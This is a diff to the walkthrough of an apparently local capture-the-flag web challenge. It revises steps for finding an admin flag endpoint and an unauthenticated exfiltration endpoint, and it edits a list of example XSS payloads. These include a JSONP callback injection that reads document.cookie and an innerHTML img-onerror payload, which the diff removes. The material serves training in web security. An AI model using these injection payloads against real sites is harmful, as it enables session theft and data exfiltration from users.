@@ -103,22 +103,24 @@ Example: `http://localhost:5174/kb?search=test&callback=...&_reportId=7`
 
 #### Step 4: Discover the Admin Flag Endpoint
 
-Try to access the flag endpoint:
+Try to access the flag endpoint directly from the main app (the Vite dev server proxies all `/api` routes to the backend):
 
 ```
-http://localhost:4001/api/admin/flag?reportId=1
+http://localhost:5174/api/admin/flag?reportId=1
+```
 
-(http://localhost:4001/api/admin/flag also works)
-
-(http://localhost:5174/api/admin/flag also works)
-
+You can also hit it from the browser DevTools console while on the site:
+```javascript
+fetch('/api/admin/flag?reportId=1').then(r=>r.json()).then(console.log)
 ```
 
 You'll get a `403 Forbidden` response with a hint:
 ```json
 {
   "error": "Admin access required",
-  "hint": "This endpoint requires admin authentication. Expected query param: reportId"
+  "hint": "This endpoint requires an active admin session.",
+  "usage": "GET /api/admin/flag?reportId=<reportId>",
+  "description": "Returns the flag associated with the given report. The flag belongs to the user who submitted the report, not the admin."
 }
 ```
 
@@ -128,7 +130,7 @@ You'll get a `403 Forbidden` response with a hint:
 
 #### Step 5: Discover the Exfiltration Endpoint
 
-Go to **My Captures** page (`/captures`). If it's empty, you'll see a hint box explaining:
+Go to **My Captures** page (`/captures`). At the top of the page you'll always see a hint box:
 
 ```
 Endpoint: POST /api/exfil/capture
@@ -136,7 +138,7 @@ Expected JSON body: {"data": ..., "reportId": ...}
 No authentication required on this endpoint.
 ```
 
-**Rationale:** The hint reveals that exfiltration is public (no auth needed) and explains the JSON schema. This removes the guesswork around how to capture data.
+**Rationale:** The hint is permanently visible (not just when the list is empty), so players always have the endpoint schema on hand while crafting their payload.
 
 ---
 
@@ -293,14 +295,9 @@ If your payload has `+` in it (like `a+b`), it will be decoded as a space in `ev
 http://localhost:5174/kb?search=test&callback=document.title='HACKED'
 ```
 
-**Alert with cookie:**
+**Alert with cookie (confirms httpOnly is set — cookie will be empty):**
 ```
 http://localhost:5174/kb?search=test&callback=alert(document.cookie)
-```
-
-**innerHTML-based XSS (search parameter):**
-```
-http://localhost:5174/kb?search=<img+src=x+onerror=alert(1)>
 ```
 
 ---
